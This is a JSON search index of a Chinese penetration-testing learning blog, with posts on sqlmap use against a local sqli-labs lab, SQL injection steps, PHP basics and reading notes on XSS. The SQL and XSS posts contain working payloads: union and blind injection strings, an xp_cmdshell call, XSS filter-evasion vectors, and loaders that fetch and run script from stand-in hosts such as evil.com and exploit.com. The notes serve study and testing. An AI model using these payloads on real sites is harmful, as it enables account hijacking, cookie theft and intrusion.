{"meta":{"title":"ea6th","subtitle":"","description":"ea6th的小站,ea6th,博客,博客笔记","author":"ea6th","url":"https://www.ea6th.top","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"07-18","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"07-18","excerpt":""},{"title":"about","text":"ea6th,爱好计算机,本站用于记录笔记目前是个安服仔，兴趣更偏向于渗透测试。","path":"about/index.html","date":"07-18","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"07-18","excerpt":""},{"title":"todo","text":"计划虽然一般不喜欢制定计划，但是很多书目经常性忘记阅读，在此处做个记录。 计算机类 通关！游戏设计之道——斯科特 · 罗杰斯（Scott Rogers） 游戏剧本怎么写——佐佐木智广 游戏设计信条：从创意到制作的设计原则——马克·阿尔比奈（Marc Albinet） 密码编码学与网络安全 鸟哥的私房菜 白帽子讲安全 https://github.com/riusksk/secbook 英语 新编英语语法教程——章振邦 听写的奥秘——宋德伟工作室 听写的奥秘：初级英语听力周计划（初中） 听写的奥秘：中级英语听力周计划（高中） 听写的奥秘：高级英语听力周计划（大学） 听写的奥秘：超级英语听力周计划（留学） Townsend Press 英语词汇学习丛书——Judith Nadell·Beth Johnson·Paul Langan（上海外语教育出版社） Vocabulary Basics 英语词汇入门 Groundwork for a Better Vocabulary 英语词汇基础 Building Vocabulary Skills 英语词汇提高 Improving Vocabulary Skills 英语词汇扩展 Advancing Vocabulary Skills 英语词汇突破 Advanced Word Power 英语词汇飞跃 可可英语、墨墨背单词、扇贝听力口语 经济 经济学原理——曼昆 西方经济学——高鸿业 风险投资简史——龚咏泉/郭勤贵 资本论——马克思 论持久战——毛泽东 目前抗日统一战线中的策略问题——毛泽东 置身事内：中国政府与经济发展——兰小欢（—） 12这本书是复旦大学经济学院副教授写的，写了很多内容，政府事务、政府收支、土地融资、城市化等等内容，内容颇为不错。当然作者特地说明了一点，“本书注重描述现实，注重解释‘是什么’和‘为什么’。当不可避免涉及‘怎么办’的时候，则注重解释当下正在实施的政策和改革”。所以斟酌后选择。 小说、漫画和电视剧小说 异常生物见闻录——远瞳（✔） 寒门崛起——朱郎才尽 源氏物语——紫式部 三体——刘慈欣（✔）以科幻小说内少有的科学严谨的画风，描述了地球文明在与三体文明以及其他文明接触过程中，发生的一系列碰撞与交流，后期更是以法则奠定了宇宙文明之间交流的基础规则，当然如果缩小至群体之间，很多东西也是如此的相似。 永恒的终结——艾萨克·阿西莫夫（✔）一个描写了可操纵时空的科幻小说 银河帝国——阿西莫夫 小王子——安东尼·德·圣埃克絮佩里/译 文西（✔） 1这本书被很多人推崇，但对于我自身来说，其实感触和共鸣并不是很多，但语言方面值得学习，因此写下了。 漫画 全频带阻塞干扰——刘慈欣（✔） 以全频带阻塞干扰器强行降神的情况下，改变世界的走向，具有一种理工科的爱国情怀。 盾之勇者成名录 我立于百万生命之上（✔） 日本动漫常见的异世界，但不是JUMP似热血的类型，而是更个人主义，更倾向于为了目的而行动。在网文界比较常见，但在日本动漫界算是少见。 鬼刀（—） 1画风极好，天赋型画手 全民审判 1比较小众的漫画，漫画中设想了泡沫危机下上帝突然出现人民审判上帝的场景（如果冒犯了信仰上帝的人，在此抱歉） 电视剧 大明王朝1566（✔） 功勋（—） 1李延年篇的朝鲜战争（极少数的严谨的战斗场景）、于敏的氢弹研制、申纪兰、孙家栋、张富清、袁隆平、黄旭华、屠呦呦。 人世间（—） 1“人生一世，草木一秋，来如风雨，去似微尘”主创如此描述，很多细节和情节处理都很不错 金婚 杂书更多是不知道该如何分类的 精神病学——沈渔邨 世界是平的——托马斯·费里德曼（Thoms L.Friedman） 禅与摩托车维修艺术——罗伯特·m·波西格 枪炮、病菌与钢铁——贾雷德·戴蒙德 家庭、私有制和国家的起源——恩格斯（✔） 不平等社会：从石器时代到21世纪,人类如何应对不平等——沃尔特·沙伊德尔 手办：让萌变得立体——MIKATAN（日） *","path":"todo/index.html","date":"07-18","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"07-18","excerpt":""}],"posts":[{"title":"一些软件整理","text":"一些软件整理与推荐 记录了本人所喜欢的软件，不定期更新。 名称 官网 支持平台 Onenote 16 https://www.onenote.com/download/ Windows、Mac、Android等 笔记 7-zip https://www.7-zip.org/ Windows CCleaner https://www.ccleaner.com/ Windows、Mac 清理注册表和软件利器 HTML Help Workshop https://www.microsoft.com/en-us/download/details.aspx?id=21138 Windows 超简洁手册 Microsoft To Do https://todo.microsoft.com/tasks/ Windows、Mac、Android 待办事项 Splash https://mirillis.com/download-splash-free-hd-video-player Windows 播放器 Typora https://typora.io/ Windows、Linux、Mac Markdown编辑器 VirtualBox https://www.virtualbox.org/wiki/Downloads Windows、Mac、Linux等 虚拟机 屏幕录像专家 http://www.tlxsoft.com/xz.htm Windows exe类型录屏软件，目前唯一用处就是拿来将.exe录屏文件转.mp4（开发者当时都没有考虑调进度条问题吧。。。 BalenaEtcher https://www.balena.io/etcher/ Windows、Linux、Mac 镜像刻录 MediaCreationTool https://www.microsoft.com/zh-cn/software-download/windows10 Windows 微软官方windows 10刻录工具 Everything https://everything.en.softonic.com/ Windows 文件名搜索工具 wonderwall https://snapcraft.io/wonderwall Linux 壁纸软件 VLC http://www.videolan.org/ Windows、Linux、Android、Mac等等 音频播放软件","path":"2020/12/03/软件/","date":"12-03","excerpt":"一些软件整理与推荐","tags":[]},{"title":"sqlmap与sqli-labs记录","text":"sqlmap与sqli-labs记录 sqlmap安装12345sudo apt-get install gitcd /opt/ //推荐把软件放到这个项目下，sudo git clone git://github.com/sqlmapproject/sqlmap.gitcd sqlmap/python sqlmap.py --update //python3改为python3即可 使用以下sqlmap命令为更加简洁省略python前缀，实际操作需根据情况而定 一般指令1234-h //帮助-hh //显示高级指令并退出--version //版本-v VERBOSE //详细信息 常用指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152sqlmap -u url -v 1 -f //指纹判别数据库类型sqlmap -u &quot;url&quot; --is-dba //是否为管理员sqlmap -u url --dbs //数据库sqlmap -u url --current-db //查看当前数据库sqlmap -u url --current-user //当前用户sqlmap -u url --users //用户sqlmap -u url -D &quot;database_name&quot; --tables //表sqlmap -u url -D &quot;database_name&quot; -T &quot;table_name&quot; --columns //字段sqlmap -u url -D &quot;database_name&quot; -T &quot;table_name&quot; -C &quot;password,username&quot; --dump//字段内容sqlmap -u url --start= --stop== -C -T -D //列指定字段sqlmap -u url --passwords //枚举密码hashsqlmap -u url --roles //枚举用户角色sqlmap -u url --first= --last= //指定首尾字符##辅助指令--proxy= //代理-r //指定请求包文件--tamper= //插件--level= //攻击等级,1-5//高于2尝试cookie参数，高于3尝试User-agent、referer注入--risk= //风险等级,1-3--privileges //枚举用户权限--exclude-sysdbs //枚举时排出系统数据库--threads xx //最大并发线程，不建议大于10--technique UES //探测注入方式##B（布尔盲注）、E（显错盲注）、U（UNION注入）、S（叠层注入）、T（时间盲注）sqlmap -u url --data &quot;uname=xx&amp;passwd=xx&amp;...&quot; //POST数据##杂-p //指定存在注入的参数--method= //--data= //--cookie= //--user-agent= //--random-agent //--host= //--random-agent //--delay= //--timeout= //--csrf-token= //--csrf-url= //--time-sec= //延长返回--tor //--tor-port= //--tor-type= //--check-tor //-o //优化--keep-alive //--threads= //最大并发请求数目 —technique xx： B（Boolean-based blind SQL injection，布尔型注入）、E（Error-based SQL Injection，报错型注入）、U（UNION query SQL Injection，可联合查询注入）、S（Stacked queries SQL Injection，可多语句查询注入）、T（Time-based blind SQL Injection，基于时间延长注入） sqli-labs不再一一叙述，仅举例说明使用 搭建ubantu搭建sqli-labs7 https://winny.work/%E6%90%AD%E5%BB%BAsqli-labs/49.html mysql8.0+修改密码 https://blog.csdn.net/lxlong89940101/article/details/80246675 实操HTTP常见注入点位置：Referer、X-Forwarded-For、Cookie、X-Real-IP、Accept-Language、Authorization。 Lesson-1 12345python3 sqlmap.py -u &quot;http://127.0.0.1/sqli1/Less-1/?id=1&quot; --leve=5 --risk=3 --dbspython3 sqlmap.py -u &quot;http://127.0.0.1/sqli1/Less-1/?id=1&quot; --leve=5 --risk=3 --dbms=mysql --current-dbpython3 sqlmap.py -u &quot;http://127.0.0.1/sqli1/Less-1/?id=1&quot; --leve=5 --risk=3 --dbms=mysql -D &quot;security&quot; --tablespython3 sqlmap.py -u &quot;http://127.0.0.1/sqli1/Less-1/?id=1&quot; --leve=5 --risk=3 --dbms=mysql -D &quot;security&quot; -T &quot;users&quot; --columnspython3 sqlmap.py -u &quot;http://127.0.0.1/sqli1/Less-1/?id=1&quot; --leve=5 --risk=3 --dbms=mysql -D &quot;security&quot; -T &quot;users&quot; -C &quot;password,username&quot; --dump Lesson-10，注入点为post提交 12345python3 sqlmap.py -u &quot;http://127.0.0.1/sqli1/Less-1/?id=11&quot; --data=&quot;uname=admin&amp;passwd=123456&amp;submit=Submit&quot; --batch或python3 sqlmap.py -r &quot;test.txt&quot; --batch //探测注入点python3 sqlmap.py -r &quot;text.txt&quot; --batch --current-db...... Lesson-18，user-agent 1234##请求包文件方式sqlmap -r 1.txt --dbs###请求包语句方式python sqlmap.py -u url --user-agent=&quot;xxx*&quot; --dbs //*表示可能存在注入的部分 Lesson-19，referer 1234##请求包文件方式sqlmap -r 1.txt --dbs###请求包语句方式python sqlmap.py -u url --referer=&quot;xxx/*&quot; --dbs Lesson-20，cookie 1234##请求包文件方式sqlmap -r 1.txt --dbs###请求包语句方式python sqlmap.py -u url --cookie=&quot;xxx&quot; --dbs 参考","path":"2020/11/30/sqlmap和sqli-labs/","date":"11-30","excerpt":"sqlmap与sqli-labs记录","tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://www.ea6th.top/tags/sqlmap/"}]},{"title":"sql注入基础","text":"mysql操作基础与sql常规注入流程 mysql基础12345678mysql -u root -p //登录mysqlmysql -u root password &quot;new&quot; //创建root密码select version();select database();select user();show status; //服务器状态show variables //服务器变量 语法 mysql数据类型 基本操作123456789101112131415161718show databases; //列出所有数据库use sql_name; //选择数据库show tables; //列出所有表show columns from table_name; //列出某表的列show index from table_name; //create database database_name;drop database database_name;create table table_name (column_1 column_type);drop table table_name;insert into table_name (field1, field2....)-&gt;values-&gt;(value1, value2...);select coluname,column_name from table_name [where ] [offset ] [limit ];select field1, field2... from table_name,table_name...[where ...] where子句：操作符包括=、&lt;&gt;/!=、&gt;、&lt;、&gt;=、&lt;=，where binary区分大小写。 update：更新/修改数据 1update table_name set field=new_value... [where] delete：删除数据 1delete from table_name [where] link子句：相当于模糊查询，使用正则表达式，mysql正则 1select field1,field2... from table_name... where field1 like condition1 [and [or]] field2 = &#x27;str&#x27;; order by：对筛选的数据排序，ASC升序，DESC降序， 1select field1, field2... from table_name1... order by field1,[field2...] [ASC/DESC] GROUP BY语句：对数据分组， 1select column_name,function(column_name) from table_name where column_name operator value group by column_name alert： 连接语句：inner join交集、left join左连接，full outer join并集。 关于NULL：is null、is not null、&lt;=&gt;是对mysql数据处理null的方式，而&lt;=&gt;用于两个值都为null时。 函数sql注入select * from table_name limit m,n; desc table_name user()，database()，version()，@@datadir数据库路径，@@version_compile_os操作系统版本。 连接字符串函数 concat(str1,str2,str) 返回str1,str2,str3，其中有一个为NULL，返回NULL，group_concat。 ascii()，ord()， 盲注函数 注入截断三大法宝：left(str,length)，substr(str,start,length)，mid(str,start,length) str可为SQL语句 MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLE WHERE table_schema=0xxxx LIMIT 0,1),1,1)&gt;’a’ substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxx LIMIT 0,1),1,1)&gt;’a’ WAITFOR DELAY ‘0:0:9’触发时间延迟 IF ELSE 还有select if(1=1,’A’,’B’); OPENROWSET重验证攻击 SELECT * FROM OPENROWSET(‘SQLOLEDB’,’127.0.0.1’;’sa’,’letmein’,’SET FMTONLY OFF execute master..xp_cmdshell “dir” ‘)— regexp，like语句 双查询语句 count()、rand()、floor()，group by ?id=1’union select 1,2,concat_ws(char(32,58,32),user(),database(),version())—+ information_schema，schemata表（show database）table（show table from schemaname） column表（show columns from schemaname.tablename） 常规步骤select database();当前数据库 select schema_name from information_schema.schemata;列出数据库 列出当前数据库表 1union select table_name from information_schema.tables where table_schema=database(); 列出当前用户自定义数据库所有表 1select table_schema,table_name from information_schema.tables where table_schema !=&#x27;information_schema&#x27;and table_schema != &#x27;mysql&#x27; 列出当前数据库xx列名 1select column_name from information_schema.columns where table_name=&#x27;xx&#x27; 列出所有用户定义数据库所有列 1select table_schema,table_name,column_name from information_schema.columns where table_schema != &#x27;information_schema&#x27; and table_schema !=&#x27;mysql&#x27; 引号过滤器 select char(0x41)+char(0x42)+char(0x43) mysql select char (65,66,67); select0x414243; ‘单引号%27，’’双引号%22，;%3b，( %28，) %29，空格%20。 union select user(),null,null;变为union select cast(user() ASchar),null,null; 注入一般流程 猜数据库名 12select schema_name from information_schema.schemata;show database; 猜表名 1select table_name from information_schema.tables where table_schema=&quot;xx&quot; 猜列名 1select column_name from information_schema.columns where table_name=&quot;xxx&quot; 字段内容 1select username,password from security.users; www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt www.ngssoftware.com/papers/advanced_sql_injection.pdf http://scanner.sec-1.com/resources/bta.pdf www.insomniasec.com/publications/Access-Through-Access.pdf http://technet.microsoft.com/en-us/library/cc512676.aspx http://pentestmonkey.net/cheat-sheets http://michaeldaw.org/sql-injection-cheat-sheet/ http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/ http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/ www.oxid.it Cain&amp;Able www.soonerorlater.hu/index.khtml?article_id=513 woraauthbf www.red-database-security.com/software/checkpwd.html www.openwall.com/john/ 参考","path":"2020/08/18/SQL数据库基础/","date":"08-18","excerpt":"mysql操作基础与sql常规注入流程","tags":[{"name":"sql","slug":"sql","permalink":"https://www.ea6th.top/tags/sql/"}]},{"title":"PHP学习（一）","text":"为了挖掘php漏洞学习的php基础 环境：phpstudy2018、VScode。 windows本地直接phpstudy老版本就行，在My HomePage位置下添加PHP文件，访问路径改成localhost/xxx或者127.0.0.1/xxx类型即可，编写代码VScode即可，需要时加个Debug就行。（由于本人目的是为了学习和对PHP进行代码审计，所以不再安装Debug） 吐槽一下，HTML文件写PHP会被注释 语法1&lt;?php echo &#x27;&lt;p&gt;this is a test&lt;/p&gt;&#x27;; ?&gt; 在html标签内多写在&lt;body&gt;&lt;/body&gt;内， 12phpinfo(); //获取系统信息$_SERVER[&#x27; &#x27;]; //获取服务器的各种信息，如HTTP_USER_AGENT为代理服务器（浏览器） 注释： 1234// //单行注释/**/ //多行注释# //单行注释 大小写问题：变量、常量区分大小写，而方法名、函数名、魔术变量、类名、布尔值、NULL不区分大小写。 变量： 字母或下划线开头，后跟任意字母、数字、下划线，还可以有中文。 可以通过&amp;引用赋值，软链接，根据被引用变量值变化，引用只能引用变量。 1234&lt;?php$test_1 = &#x27;a&#x27;;$test_2 = &amp;$test_1;?&gt; 范围方面，与其他语言不同，必须要声明global全局变量。 静态变量使用static，不会被重置变量值，对于静态函数的递归，可以用count结束。 123456789101112&lt;?phpfunction test()&#123; static $count = 0; $count++; echo $count; if ($count &lt;10 ) &#123; test(); &#125; $count--;&#125;?&gt; 可变变量：如下面输出为ababc。 123456&lt;?php$a = &#x27;ab&#x27;;$$a = &#x27;abc&#x27;;echo $a;echo $ab;?&gt; PHP外变量：如GET、POST请求处理表单、Cookie，变量点、空格被转化为下划线。 123456&lt;?php echo $_POST[&#x27;username&#x27;]; echo $_REQUEST[&#x27;username&#x27;]; import_request_variables(&#x27;p&#x27;,&#x27;p_&#x27;); echo $p_username;?&gt; 常量：通过define()定义，包括boolean、integer、float、string数据类型，与变量不同。没有$符号。 数据类型查看表达式值或者类型用var_dump()函数，用于调试用gettype()函数，检验某个类型用is_type函数。如： 12gettype($test);is_int($test) 具体类型： 1234567891011121314151617181920212223242526&lt;?php$test_Boolean = true //布尔型，包括true和false，不区分大小写$test_Integer = 125 //整形，可用多种进制位表示，超出整形范围会变成float$test_Float = 1.23 //浮点型，也可用7e-10表示$test_String = &quot;string&quot; //字符串，通过\\进行转义&#x27;与\\，单引号不支持\\n等转义...$test_Array = array( 1 =&gt; &quot;a&quot;, &quot;1&quot; =&gt; &quot;b&quot;, true=&gt; &quot;c&quot;, &quot;car&quot;,&quot;computer&quot;,&quot;fruit&quot;,); //数组，key =&gt; value类型，可内嵌，key只能是整形或字符串，通过用var_dump()查看所有数组元素，可用[]代替array()，删除键值对用unset()。不指定key会自动数字依次排序。class test_object&#123; function do_test() &#123; echo &quot;this is example.&quot;; &#125;&#125;$test = new test_object;$test-&gt;do_test();//对象，$test_null = NULL //NULL通过is_null()和unset()使用?&gt; 伪类型：mixed（多种类型）、number、callback（与callable相同）、array|object、void（返回值无用，不接受任何参数） Callable（可调用） Resource（资源） 注意 字符串的单引号与双引号效果不同，双引号内可对\\n、\\r、\\\\、\\&quot;、[0-7]&#123;1,3&#125;进行转义解析 数组的key记得有强制转换，所以1与true、浮点型和整形等等容易冲突， 强制转换：用法如下 1234&lt;?php$test_int = 10;$test_boolean = (boolean) $test_int;?&gt; 在进行运算和函数使用中，也会出现强制转换。强制转换常用有(int)/(integer)、(bool)/(boolean)、(float)/(double)/(real)、(string)、(array)、(object)、(unset)。 boolean（布尔值）：对于false、整数值为0、浮点值0.0、空字符串、字符串为”0”、不包含任何元素的数组、特殊类型NULL、空标记生成的SimpleXML对象，均会被认为是false。 integer（整形）：使用(int)或(integer)进行转换，浮点型转化向下取整。 unset用于转化为NULL。 运算和其他语言的运算符类似，不再赘述，仅说明易错的几点。 ==与===：==为两个变量数据类型转换后相等，===则是数据类型和值均等。 &lt;=&gt;组合比较符与?? NULL操作符。三元运算符(expr1)?(expr2):(expr3)简化了判断语句。 比较浮点数不应该直接比较，可以使用下面的方法。 12345&lt;?phpif (abs($a-$b) &lt; $precision) &#123; echo &quot;true&quot;;&#125;?&gt; ++$a是先加一后返回，$a++是先返回后加一，减法类似、 字符串运算符是.，与其他语言字符串用+不同。 数组运算符与普通运算符不同。+为联合，===相对于==增加了顺序一致，!=为不等，!==为不全等。 类型运算符：instandceof &amp;：引用，$a =&amp; $b;并不是像c指针一样，而是两个均指向一个区域。需要取消引用时用unset($b);，可以看出来两者分离。 语句 if…else：else if可以写为elseif。 1234567&lt;?php if () &#123;&#125; ?&gt;//或 HTML与PHP混用&lt;?php if (xx !== FALSE) &#123; ?&gt;&lt;p&gt;false&lt;/p&gt;&lt;?php &#125; else &#123; ?&gt;&lt;p&gt;true&lt;/p&gt;&lt;?php &#125; ?&gt; 也可以写为 1234567&lt;?phpif (): echo xxx;else: echo xxx;endif;?&gt; while：&lt;?php while () &#123;&#125;，也可以用endwhile; do…while：&lt;?php do &#123; &#125; while ();， for：for (expr1: expr2: expr3) &#123; &#125;，也可以用endfor;。 foreach：可以遍历数据和对象，在下面第一种如果添加&amp;会改变原数组。 12foreach ($array as $value) &#123;&#125; //通过遍历数组赋值并前进指针foreach ($array as $key =&gt; $value) &#123;&#125; //除第一种效果外，还会降键名赋值到$key swith：switch () &#123;case 1: ;case 2: ;default: ;&#125;形式。 declare：declare (directive) &#123;&#125;，directive包括ticks与encoding两方面。 include用于包含并运行文件，include &#39;xx.xx&#39;，windows下以\\为路径顺序，linux/unix以/为顺序。 goto，跳转程序位置。&lt;?php goto a; echo &#39;test_1&#39;; a: echo &#39;test_2&#39;;?&gt; 自定义函数，传参与实参不再赘述，也可以定义传参的数据类型。也可以使用匿名函数，无须写函数名。 12345&lt;?phpfunction test($var_1, $var_2,...,$var_n) &#123;&#125;test();?&gt; 类与对象一个类的实例：输出多个变量用.隔开。可以通过::（范围解析操作符）访问静态成员、类和常量。如类名::常量 123456789101112131415&lt;?phpclass testClass &#123;##属性 var $var1; var $var2 = &quot;test&quot;;##方法 function testFun1 ($arg1, $arg2) &#123; xxx; $this &#125; function testFun2 () &#123; echo xxx; &#125;&#125;?&gt; $this代表自身对象，通过下面方式创建该类的对象。（PHP并不支持多继承） 123456789&lt;?php$var1 = new testClass;$var2 = new testClass;$var3 = new testClass;class testClass &#123;&#125;?&gt; 调用成员函数，用来设置该类对应对象的方法。 12$var1-&gt;testFun1(&quot; xxx &quot;);$var2-&gt;testFun1(&quot; xxx &quot;); 调用成员函数获得对应对象方法的内容。 12$var1-&gt;testFun2();$var2-&gt;testFun2(); extends：用来继承另一个类的方法和属性，不支持多重继承。如果父类方法定义使用了final则不可覆盖，可以通过parent::访问被覆盖的方法或属性。 static：静态属性或方法。 PHP_EOL：为换行符 对象比较：==用于对象之间属性和属性值相等，且都是一个类的实例，而===为同一个对象。 构造函数：简化调用函数步骤，在引用类的对象时设置。 123456$var1 = new testClass(&#x27; xxx &#x27;, &#x27; xxxx &#x27;);$var2 = new testClass(&#x27; xxx &#x27;, &#x27; xxxx &#x27;);$var3 = new testClass(&#x27; xxx &#x27;, &#x27; xxxx &#x27;);$var1-&gt;testFun2();$var2-&gt;testFun2();$var3-&gt;testFun2(); 析构函数（destructor）： 类的自动加载 访问控制：通过关键词public（公有）、protected（受保护）或私有（private）实现属性和方法的访问控制。 public：可在任何地方被访问。用var定义也被认为是公有。 protected：受保护的可被自身及其子类和父类访问。 private：只能被定义所在类访问。 接口（interface）：通过interface定义，其内定义方法为公有，再通过implements实现接口定义的所有方法。 1234567891011interface testTemplate &#123; public function test1($var1, $var2); ...&#125;class Template implements testTemplate &#123; private $var3 = array(); public function test1($var1, $var2) &#123; $this-&gt;var3[$name] = $var; &#125; ...&#125; 使用时用testTemplate::test1();即可。 抽象类： 命名空间通过namespace定义， 12345678&lt;?phpnamespace test1 &#123;&#125;namespace test2\\test3 &#123;&#125;namespace &#123;&#125; ##全局声明?&gt; $show_separators 函数123456&lt;?phpfunction test()&#123; return 10;&#125;?&gt; 1var_dump() //显示变量信息 参考[ 1 ]：PHP官方手册 [ 2 ]：W3Cschool","path":"2020/08/08/PHP学习（一）/","date":"08-08","excerpt":"为了挖掘php漏洞学习的php基础","tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.ea6th.top/tags/PHP/"}]},{"title":"《XSS跨站脚本攻击剖析与防御》读书笔记","text":"《XSS跨站脚本攻击剖析与防御》笔记，提醒!!!本笔记只是粗略笔记，如果希望学习，更推荐看原书!!! Shellcode：利用漏洞所执行的代码 Exploit：完整的漏洞利用工具/程序 POC：Proof of Concept缩写，证明漏洞存在的程序代码。 基础123&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&quot;&gt;&lt;iframe src=http://www.test.com width=0 height=0&gt;&lt;/iframe&gt; get或者post均可， 危害： 钓鱼，盗取账号 窃取cookie，获得隐私信息，或盗用用户身份对网站执行操作。 劫持用户（浏览器）会话，执行任意操作。 刷流量、强制广告 网页挂马 提升权限、传播跨站脚本蠕虫等等 分类： 反射型XSS（Reflected Cross-site Scripting）：又称非持久性跨站脚本， 12http://www.test.com/search.php?key=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;http://www.test.com/login.asp?out=1&amp;url=javascript:alert(document.cookie) ​ 一般需要点击弹窗或链接来去触发，增加了攻击成本。 存储型XSS（Stored Cross-site Scripting）：又称持久性跨站脚本。 通过上传或存储到服务器中，用户浏览页面即可执行，多出现在留言、评论、博客等等交互位置。记得闭合&lt;textarea&gt;标签。 12&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;textarea&gt; ​ 常用来获得cookie、获取数据库等等。 Cheat Sheet：各种各样的XSS代码在不同浏览器、应用场景、环境的触发的可能列表。 推荐几个github的 [ 1 ]：XSS Filter Evasion Cheat Sheet 中文版 [ 2 ]：Browser’s XSS Filter Bypass Cheat Sheet，（建议谷歌翻译与原文对照食用） 还有很多，建议github搜索相关关键词学习总结。 XSS Expliot构造： 绕过XSS-Filter： XSS-Filter：基于黑白名单的安全过滤策略进行过滤、编码等操作。 &lt;&gt;的使用：&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;。 HTML标签属性值：利用javascript:[code]伪协议。 12&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;&lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt; 测试可用href=、lowscr=、background=、value=、action=等等。 空格回车Tab：注意有Tab键、回车、空格额等。 12345678&lt;img src=&quot;javas cript:alert(/xss/)&quot; width=100&gt;&lt;var a= &#x27;hello world&#x27;;alert(a);//遇到分号或发现语句完整才会结束。&lt;img src=&quot;javascript:alert(/xss/)&quot; width=100&gt; 对属性值转码：如ASCII，还可以插入空格、换行符的ASCII编码。ASCII编码 123456&lt;img src=&quot;javascrip&amp;#116;&amp;#58;alert(/xss/);&quot;&gt;//&amp;#116为t，&amp;#58为:&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;body onload=&#x27;vbs:execScript&quot;alert(0)&quot;,&quot;&amp;#x6a;avascript&quot;&#x27;&gt;&lt;img src=&quot;&amp;#01;javascript:alert(/a/)&quot;&gt;&lt;img src=&quot;java&amp;#09;scr&amp;#10;ipt:alert(/a/)&quot;&gt; 创建事件： 12&lt;input type=&quot;button&quot; value=&quot;click me&quot; onclick=&quot;alert(&#x27;click me&#x27;)&quot; /&gt;&lt;img src=&quot;#&quot; onerror=alert(/xss/)&gt; 利用CSS跨站解析： 123&lt;div style=&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;&lt;div style=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;&lt;img src=&quot; javascript:alert(&#x27;xss&#x27;)&quot;&gt; 更为巧妙的运用，link方法 123456//更巧妙的运用，地址为test.com/index.cssp &#123;background-image: expression(alert(&quot;XSS&quot;));&#125;//与目标网站&lt;link rel=&quot;stylesheet&quot; href=&quot;http://www.test.com/index.css&quot;&gt; @import方法 12345678910&lt;style type=&#x27;text/css&#x27;&gt;@import url(http://www.evil.com/xss.css);&lt;/style&gt;自身网站内容为.showCSS&#123;event:expression(onload = function()&#123;alert(&#x27;XSS&#x27;);&#125;)&#125; @import的直接引用 123&lt;style&gt; @import &#x27;javascript:alert(&quot;XSS&quot;)&#x27;;&lt;/style&gt; 扰乱过滤规则： 大小写：&lt;IMG SRC=&quot;javascript:alert(0);&quot;&gt; 大小写混淆：&lt;iMg sRc=&quot;jaVasCript:alert(0);&quot;&gt; 单引号：img src=&#39;javascript:alert(0);&#39;&gt; 不用引号：&lt;img src=javascript:alert(0);&gt; 全角符号的扰乱：&lt;div style=&quot;｛left:expression（alert(&#39;xss&#39;)）｝&quot;&gt;。 注释：&lt;div style=&quot;wid/****/th:expre/*XSS*/ssion(alert(&#39;XSS&#39;));&quot;&gt;。 \\与\\0等被浏览器忽略的字符：@\\0im\\port&#39;\\0ja\\vasc\\ript:alert(&quot;xss&quot;)&#39;; 转码：&lt;p style=&quot;xss:\\65xpression(alert(/XSS/))&quot;&gt;。e与\\65 字符编码：对属性值进行&amp;#;ASCII编码，或者添0变为&amp;#0xx;之类，或者使用十六进制等其他进制。或者使用javascript的evil()、String.fromCharCode()函数进行转换。 12//&lt;img src=&quot;javascript:eval(alert(&#x27;XSS&#x27;))&quot;&gt;&lt;img src=&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,41))&quot;&gt; 类似的，引入其他文件地址，url(http://test.com)也可以进行编码。编码方法包括JScript Encode、VBScript Encode、unicode、escapes、进制等等。 拆分跨站法：对于有输入字符限制的，可以使用拆分用变量不断构造，最后输出即可。（和缓冲区溢出的shellcode类似） Shellcode调用 动态调用远程JavaScript： 例如Exploit位置在http://www.test.com/view.php?sort=[Expliot]，为了方便利用通过&lt;script&gt;动态加载。 1http://www.test.com/view.php?sort=&quot;&gt;&lt;script src=http://www.exploit.com/xss.js&gt;&lt;/script&gt;&lt;http://www.bug.com/view.php?sort=&quot;&gt;&lt;script src=http://www.exploit.com/xss.js&gt;&lt;/script&gt;&lt; 还能基于DOM创建和输入节点， 123var a=document.createElement(&quot;script&quot;);a.src=&quot;http://www.test.com/xss.js&quot;;document.getElementsByTagName(&quot;head&quot;)[0].appendChild(s); 使用window.location.hash window.location.hash属性也可以解决长度问题，本身是用来获取和设置页面标签值。 1http://www.test.com/view.php?sort=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(&#x27;xss&#x27;) XSS Downloader：事先写入到网站某个页面，再利用XMLHTTP控件发送HTTP请求然后执行返回即可。需要XMLHTTP技术基础。 12345678910function XSS()&#123;a=new ActiveXObject(&#x27;Microsoft.XMLHTTP&#x27;);a.Open(&#x27;get&#x27;,&#x27;http://www.test.com/123.html&#x27;,false);/a.send();b=a.responseText;eval(unescape(b.substring(b.indexOf(&#x27;BOF|&#x27;)+4,b.indexOf(&#x27;|EOF&#x27;))));&#125;XSS();//http:www.test.com/123.html写入ShellcodeXx09abcxddxBOF|alert(/XSS/)|EOFxxx44xx1212 备选存储技术：cookie存储有缺点，在于容量有限。 12345function setShellCode(codz)&#123;var exp=new Date();exp.setTime(exp.getTime()+365*24*60*60*1000);document.cookie=&#x27;shellcode=&#x27;+escape(codz)+&#x27;;&#x27;+&#x27;expires=&#x27;+exp.toGMTString();&#125; 还有是存储容器Flash共享对象（Shared Object,SO），被称为Flash Cookie， 